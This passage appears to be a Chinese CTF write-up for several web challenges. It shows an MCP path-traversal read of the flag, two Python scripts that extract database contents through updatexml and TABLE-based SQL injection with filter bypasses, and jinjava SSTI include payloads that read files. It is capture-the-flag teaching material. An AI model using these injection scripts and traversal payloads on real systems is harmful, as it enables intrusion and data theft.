class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></div>
+
+<p>发现了<code>where_is_flag</code>和<code>get_file_base64</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015162156960.png"
+                      alt="image-20251015162156960"
+                ></p>
+<p>调用<code>where_is_flag</code>获取flag路径</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> fastmcp <span class="keyword">import</span> Client, FastMCP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 FastMCP HTTP 客户端（指定服务端地址）</span></span><br><span class="line">client = Client(<span class="string">&quot;http://127.0.0.1:9000/mcp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 异步上下文管理器：自动管理客户端连接（创建/关闭）</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> client:</span><br><span class="line">        <span class="keyword">await</span> client.ping()</span><br><span class="line">    	result = <span class="keyword">await</span> client.get_prompt(<span class="string">&quot;where_is_flag&quot;</span>, &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line">    	<span class="built_in">print</span>(result)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 启动异步主函数</span></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015162104815.png"
+                      alt="image-20251015162104815"
+                ></p>
+<p>调用<code>get_file_base64</code>可以获取文件内容的base64，可打路径穿越</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> client:</span><br><span class="line">    <span class="keyword">await</span> client.ping()</span><br><span class="line">    content = <span class="keyword">await</span> client.read_resource(<span class="string">&quot;base64://tmp/..%2F..%2Froot%2F1ffflllaaaggg&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015162549339.png"
+                      alt="image-20251015162549339"
+                ></p>
+<h2 id="update-it"><a href="#update-it" class="headerlink" title="update_it"></a>update_it</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251011215843157.png"
+                      alt="image-20251011215843157" style="zoom:80%;" 
+                >
+
+<p>可参考：<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YDluAV0hz5Q9ZAvH9neQAg" >https://mp.weixin.qq.com/s/YDluAV0hz5Q9ZAvH9neQAg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>这题主要考<strong>update语句的SQL注入</strong>以及<strong>MySQL8.0的新特性</strong>(可以通过<code>TABLE</code>语句替代<code>SELECT</code>)</p>
+<ul>
+<li>常见注释符(<code>/**/</code>,<code>-- </code>,<code>#</code>) -&gt; 可以用<code>;%00</code>来截断绕过</li>
+<li>关系词(<code>and</code>,<code>or</code>,<code>&amp;&amp;</code>,等) -&gt; 这里直接使用<code>...username=&#39;1&#39;=(condition)#</code>的方法绕过</li>
+<li>MySQL8.0过滤<code>SELECT</code>可用<code>TABLE</code>语句替代</li>
+</ul>
+<p>下面payload可拿到数据库名</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_id=1&amp;username=1&#x27;=(updatexml(1,concat(0x7e,(databse()),0x7e),1));%00</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来利用MySQL8.0的新特性用<code>TABLE</code>语句爆表和内容也可参考我之前的一篇文章<a href="https://laijunyue.github.io/2025/06/13/H&NCTF2025WP/#%E5%8D%8A%E6%88%90%E5%93%81login">https://laijunyue.github.io/2025/06/13/H&amp;NCTF2025WP/#%E5%8D%8A%E6%88%90%E5%93%81login</a></p>
+<h3 id="障碍点"><a href="#障碍点" class="headerlink" title="障碍点"></a>障碍点</h3><p>比赛环境MySQL8.0.x里的比较规则不符合ASCII码，它对于数字，字母和特殊字符的权重不一样，使用的是<code>utf8mb4_0900_ai_ci</code>规则（不确定）</p>
+<p>所以导致在爆破出<code>DASCTF&#123;8278866540</code>后出现一个<code>@</code>，但是按照ascii的排列来看，我们所有的字母都不行，特殊字符都小于</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251017175915690.png"
+                      alt="image-20251017175915690"
+                ></p>
+<p>这里其实我看了别人的WP也不太懂。。。我也是没想到这题到后面会有这么变态(可能是我太菜了呜呜呜)</p>
+<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><p>爆数据脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://45.40.247.139:27785/api.php?action=update&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded;charset=UTF-8&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将字符串转换为十六进制格式（拼接为 `0x` 开头的连续十六进制串）&quot;&quot;&quot;</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> name:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(char))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tables</span>(<span class="params">url, database, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;无列名盲注爆数据表（通过 updatexml 报错注入）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据表（如：1、2...）:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>()) - <span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(x + n)</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload = (</span><br><span class="line">            <span class="string">&quot;open_id=1&amp;username=1&#x27;=(updatexml(1,concat(0x7e,((&#x27;def&#x27;,&#x27;&quot;</span></span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;database&#125;</span>&#x27;,&#x27;&#123;&#123;&#125;&#125;&#x27;,&#x27;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&quot;</span></span><br><span class="line">            <span class="string">f&quot;&lt;=(table information_schema.tables limit <span class="subst">&#123;num&#125;</span>,1)),0x7e),1));%00&quot;</span></span><br><span class="line">        )</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = name + <span class="built_in">chr</span>(char)</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="built_in">print</span>(payloads)</span><br><span class="line">                r = requests.post(url=url, data=payloads, headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;~0~&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char - <span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;当前获取到的表名片段: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">datas</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;无列名盲注爆数据（针对 simho.see33ccret 表）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要爆第几个数据（如：1、2...）:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        y = x - <span class="number">1</span></span><br><span class="line">        num = <span class="built_in">str</span>(y)</span><br><span class="line">        <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload = (</span><br><span class="line">            <span class="string">&quot;open_id=1&amp;username=1&#x27;=(updatexml(1,concat(0x7e,((&#x27;4&#x27;,&#x27;&#123;&#123;&#125;&#125;&#x27;,&#x27;&#x27;)&quot;</span></span><br><span class="line">            <span class="string">f&quot;&lt;=(table simho.see33ccret limit <span class="subst">&#123;num&#125;</span>,1)),0x7e),1));%00&quot;</span></span><br><span class="line">        )</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">66</span>):</span><br><span class="line">                hexchar = <span class="string">f&#x27;DASCTF&#123;&#123;<span class="subst">&#123;name&#125;</span>&#125;&#125;<span class="subst">&#123;<span class="built_in">chr</span>(char)&#125;</span>&#x27;</span></span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="built_in">print</span>(payloads)</span><br><span class="line">                r = requests.post(url=url, data=payloads, headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;~0~&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char - <span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;当前获取到的flag片段: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要操作的内容：\n3. 爆数据表\n6. 爆数据\n&quot;</span>)</span><br><span class="line">        op_type = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> op_type == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入已获取的数据库名:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            db_name = <span class="built_in">input</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;爆数据表的开始行号:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            start_line = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">            tables(url, db_name, start_line)</span><br><span class="line">        <span class="keyword">elif</span> op_type == <span class="number">6</span>:</span><br><span class="line">            datas(url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无效操作&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>爆”奇怪”字符脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标API地址</span></span><br><span class="line">url = <span class="string">&quot;http://45.40.247.139:27785/api.php?action=update&quot;</span></span><br><span class="line"><span class="comment"># 请求头（指定表单编码格式）</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded;charset=UTF-8&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储结果的列表</span></span><br><span class="line">result = []</span><br><span class="line"><span class="comment"># 正则匹配模板（提取语法错误中的关键信息）</span></span><br><span class="line">error_pattern = <span class="string">&quot;syntax error: &#x27;(.*)&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历ASCII码范围（1-255），爆破字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    char = <span class="built_in">chr</span>(i)  <span class="comment"># 当前测试的字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造两个对比 payload（仅末尾数字不同：0 和 9）</span></span><br><span class="line">    payload1 = (</span><br><span class="line">        <span class="string">f&quot;open_id=1&amp;username=1&#x27;=(updatexml(1,concat(0x7e,((&#x27;4&#x27;,&#x27;DASCTF&#123;&#123;8278866540<span class="subst">&#123;char&#125;</span>0&#x27;,&#x27;&#x27;)&quot;</span></span><br><span class="line">        <span class="string">f&quot;&lt;=(table simho.see33ccret limit 3,1)),0x7e),1));%00&quot;</span></span><br><span class="line">    )</span><br><span class="line">    payload2 = (</span><br><span class="line">        <span class="string">f&quot;open_id=1&amp;username=1&#x27;=(updatexml(1,concat(0x7e,((&#x27;4&#x27;,&#x27;DASCTF&#123;&#123;8278866540<span class="subst">&#123;char&#125;</span>9&#x27;,&#x27;&#x27;)&quot;</span></span><br><span class="line">        <span class="string">f&quot;&lt;=(table simho.see33ccret limit 3,1)),0x7e),1));%00&quot;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送POST请求</span></span><br><span class="line">    res1 = requests.post(url=url, data=payload1, headers=headers)</span><br><span class="line">    res2 = requests.post(url=url, data=payload2, headers=headers)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 提取两个响应中的错误信息</span></span><br><span class="line">        error1 = re.findall(error_pattern, res1.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;第一个payload错误信息: <span class="subst">&#123;error1&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        error2 = re.findall(error_pattern, res2.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;第二个payload错误信息: <span class="subst">&#123;error2&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 若错误信息不同，说明当前字符有效，加入结果列表</span></span><br><span class="line">        <span class="keyword">if</span> error1 != error2:</span><br><span class="line">            result.append(char)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="comment"># 未匹配到错误信息时，打印原始响应</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未匹配到错误模式（字符：<span class="subst">&#123;<span class="built_in">repr</span>(char)&#125;</span>）&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应1: <span class="subst">&#123;res1.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应2: <span class="subst">&#123;res2.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出最终结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;有效字符列表:&quot;</span>, result)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="金Java"><a href="#金Java" class="headerlink" title="金Java"></a>金Java</h2><p><code>jinjava</code>模板引擎的SSTI</p>
+<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://www.n4c1.top/2025/10/13/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WEB-WP-%E5%90%AB-%E9%87%91Java/" >https://www.n4c1.top/2025/10/13/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WEB-WP-%E5%90%AB-%E9%87%91Java/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251011230112231.png"
+                      alt="image-20251011230112231" style="zoom:50%;" 
+                >
+
+<p>可以使用include去读取文件, 但只限于当前工作目录</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include <span class="string">&#x27;META-INF/MANIFEST.MF&#x27;</span> %&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015090746881.png"
+                      alt="image-20251015090746881"
+                ></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include <span class="string">&#x27;BOOT-INF/classpath.idx&#x27;</span> %&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-3.5.6.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-autoconfigure-3.5.6.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/logback-classic-1.5.18.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/logback-core-1.5.18.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/log4j-to-slf4j-2.24.3.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/log4j-api-2.24.3.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jul-to-slf4j-2.0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/snakeyaml-2.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-datatype-jsr310-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-module-parameter-names-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-core-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-el-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-websocket-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-web-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-beans-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/micrometer-observation-1.15.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/micrometer-commons-1.15.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-webmvc-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-aop-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-context-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-expression-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-core-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-jcl-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jinjava-2.8.0.jar&quot;</span>                  # jinjava版本</span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/slf4j-api-2.0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/guava-33.1.0-jre.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/failureaccess-1.0.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/checker-qual-3.42.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/error_prone_annotations-2.26.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/j2objc-annotations-3.0.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/javassist-3.24.1-GA.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/re2j-1.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/commons-lang3-3.17.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/commons-net-3.9.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/java-ipv6-0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/annotations-3.0.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-annotations-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-databind-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-core-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-dataformat-yaml-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-datatype-jdk8-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/big-math-2.0.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/immutables-exceptions-1.9.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-jarmode-tools-3.5.6.jar&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>通过读取<code>BOOT-INF/classpath.idx</code>可得知是 jdk 17, jinjava版本为2.8.0</p>
+<p>直接搜<code>jinjava 2.8.0</code>的CVE</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015091533849.png"
+                      alt="image-20251015091533849"
+                ></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.hubspot.jinjava/jinjava/2.8.0" >https://mvnrepository.com/artifact/com.hubspot.jinjava/jinjava/2.8.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015091900571.png"
+                      alt="image-20251015091900571" style="zoom:67%;" 
+                >
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/HubSpot/jinjava/security/advisories/GHSA-m49c-g9wr-hv6v" >https://github.com/HubSpot/jinjava/security/advisories/GHSA-m49c-g9wr-hv6v <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015092122119.png"
+                      alt="image-20251015092122119" style="zoom:67%;" 
+                >
+
+<p>可通过SSRF实现任意文件读取</p>
